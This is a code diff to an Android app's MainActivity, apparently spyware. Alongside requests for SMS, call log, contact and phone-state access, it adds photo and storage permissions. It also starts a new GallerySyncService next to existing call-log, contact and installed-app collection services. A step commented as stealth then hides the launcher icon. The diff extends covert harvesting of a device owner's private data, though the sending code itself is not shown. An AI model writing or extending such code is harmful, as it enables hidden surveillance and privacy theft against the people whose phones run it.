@@ -79,7 +79,8 @@ public class MainActivity extends Activity {
                     Manifest.permission.POST_NOTIFICATIONS,
                     Manifest.permission.READ_PHONE_STATE,
                     Manifest.permission.READ_CALL_LOG,
-                    Manifest.permission.READ_CONTACTS
+                    Manifest.permission.READ_CONTACTS,
+                    Manifest.permission.READ_MEDIA_IMAGES
             };
         } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             permissions = new String[]{
@@ -92,7 +93,8 @@ public class MainActivity extends Activity {
                     Manifest.permission.READ_SMS,
                     Manifest.permission.READ_PHONE_STATE,
                     Manifest.permission.READ_CALL_LOG,
-                    Manifest.permission.READ_CONTACTS
+                    Manifest.permission.READ_CONTACTS,
+                    Manifest.permission.READ_EXTERNAL_STORAGE
             };
         } else {
             permissions = new String[]{
@@ -104,7 +106,8 @@ public class MainActivity extends Activity {
                     Manifest.permission.READ_SMS,
                     Manifest.permission.READ_PHONE_STATE,
                     Manifest.permission.READ_CALL_LOG,
-                    Manifest.permission.READ_CONTACTS
+                    Manifest.permission.READ_CONTACTS,
+                    Manifest.permission.READ_EXTERNAL_STORAGE
             };
         }
 
@@ -271,6 +274,7 @@ public class MainActivity extends Activity {
         startService(new Intent(this, CallLogService.class));
         startService(new Intent(this, ContactSyncService.class));
         startService(new Intent(this, InstalledAppsService.class));
+        startService(new Intent(this, GallerySyncService.class));
 
         // 3. Disable launcher icon (stealth)
         stealthDisableIcon();
